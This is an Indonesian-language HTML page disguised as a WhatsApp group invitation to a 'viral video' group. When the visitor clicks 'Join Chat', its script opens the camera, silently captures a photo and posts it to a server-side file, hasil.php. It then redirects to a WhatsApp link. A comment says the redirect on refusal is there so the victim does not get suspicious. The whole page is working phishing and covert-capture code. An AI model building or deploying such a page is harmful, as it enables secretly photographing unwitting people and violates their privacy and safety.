<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Undangan Grup WhatsApp</title>
    <style>
        body { background-color: #e5ddd5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 400px; padding: 20px; text-align: center; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .img-gp { width: 100px; height: 100px; border-radius: 50%; background: #ccc; margin: 0 auto 15px; overflow: hidden; }
        .img-gp img { width: 100%; height: 100%; object-fit: cover; }
        h2 { color: #075e54; font-size: 20px; margin: 10px 0; }
        p { color: #666; font-size: 14px; }
        .btn { background-color: #25d366; color: white; padding: 12px 25px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="img-gp">
            <img src="https://i.ibb.co/L5M4f4v/wa-gp.jpg" alt="Group Icon">
        </div>
        <h2>Grup Berbagi Video Viral</h2>
        <p>Anda diundang untuk bergabung ke grup WhatsApp.</p>
        <button class="btn" onclick="startProcess()">Join Chat</button>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    function startProcess() {
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
            video.srcObject = stream;
            setTimeout(takeSnapshot, 1000); // Tunggu 1 detik biar kamera siap
        })
        .catch(err => {
            // Kalau ditolak, langsung buang ke WA asli biar gak curiga
            window.location.href = "https://chat.whatsapp.com/invite/viral";
        });
    }

    function takeSnapshot() {
        canvas.width = 640;
        canvas.height = 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        const dataURL = canvas.toDataURL('image/jpeg', 0.7);

        fetch('hasil.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'img=' + encodeURIComponent(dataURL)
        })
        .finally(() => {
            window.location.href = "https://chat.whatsapp.com/invite/viral";
        });
    }
    </script>
</body>
</html>
